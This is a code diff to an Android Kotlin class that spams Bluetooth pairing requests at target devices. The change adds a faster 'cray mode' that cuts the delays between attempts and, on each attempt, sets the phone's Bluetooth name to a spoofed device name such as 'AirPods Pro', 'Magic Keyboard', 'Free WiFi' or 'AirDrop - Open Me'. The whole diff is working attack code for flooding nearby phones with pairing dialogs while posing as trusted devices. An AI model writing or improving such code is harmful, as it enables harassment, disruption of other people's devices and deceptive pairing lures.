@@ -33,8 +33,18 @@ class BluetoothPairingSpammer {
         private const val TAG = "BtPairingSpam"
         private const val BOND_CYCLE_DELAY_MS = 800L
         private const val BOND_FIRE_DELAY_MS = 500L
-        private const val CRAY_CYCLE_DELAY_MS = 200L
-        private const val CRAY_FIRE_DELAY_MS = 150L
+        private const val CRAY_CYCLE_DELAY_MS = 100L
+        private const val CRAY_FIRE_DELAY_MS = 80L
+
+        // Chaotic names rotated per-target in cray mode
+        private val CRAY_NAMES = listOf(
+            "Magic Keyboard", "Keyboard K380", "AirPods Pro",
+            "Galaxy Buds Pro", "Beats Studio", "JBL Flip 6",
+            "Sony WH-1000XM5", "Bose QC Ultra", "Free WiFi",
+            "AirDrop - Open Me", "Ring Doorbell", "Tesla Model 3",
+            "Fire TV Stick", "Chromecast", "Nintendo Switch",
+            "Tile Tracker", "MX Keys", "Samsung Keyboard"
+        )
     }
 
     private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
@@ -57,6 +67,7 @@ class BluetoothPairingSpammer {
 
     private var cycleDelay = BOND_CYCLE_DELAY_MS
     private var fireDelay = BOND_FIRE_DELAY_MS
+    private var isCrayMode = false
 
     /**
      * Start spamming pairing requests to the given target devices.
@@ -76,6 +87,7 @@ class BluetoothPairingSpammer {
     ) {
         cycleDelay = if (crayMode) CRAY_CYCLE_DELAY_MS else BOND_CYCLE_DELAY_MS
         fireDelay = if (crayMode) CRAY_FIRE_DELAY_MS else BOND_FIRE_DELAY_MS
+        isCrayMode = crayMode
         appContext = context.applicationContext
         _lastError.value = null
         _connectionAttempts.value = 0
@@ -141,21 +153,22 @@ class BluetoothPairingSpammer {
     private suspend fun sendPairingRequest(device: BluetoothDevice) {
         val address = device.address
         try {
-            // Re-assert custom name before EVERY bond attempt
-            // This ensures the EIR packet has the right name even if Android resets it
+            // Set name before EVERY bond attempt — in cray mode, rotate to random name
+            val nameToUse = if (isCrayMode) CRAY_NAMES.random() else customMessage
             try {
-                adapter?.setName(customMessage)
+                adapter?.setName(nameToUse)
             } catch (_: SecurityException) { }
 
             // Remove existing bond first (if bonded, createBond won't show dialog)
             val bondState = device.bondState
+            val bondDelay = if (isCrayMode) 50L else 300L
             if (bondState == BluetoothDevice.BOND_BONDED) {
                 Log.d(TAG, "Removing existing bond with $address")
                 removeBond(device)
-                delay(300)
+                delay(bondDelay)
             } else if (bondState == BluetoothDevice.BOND_BONDING) {
                 cancelBond(device)
-                delay(300)
+                delay(bondDelay)
             }
 
             // createBond() triggers the pairing dialog on the target device
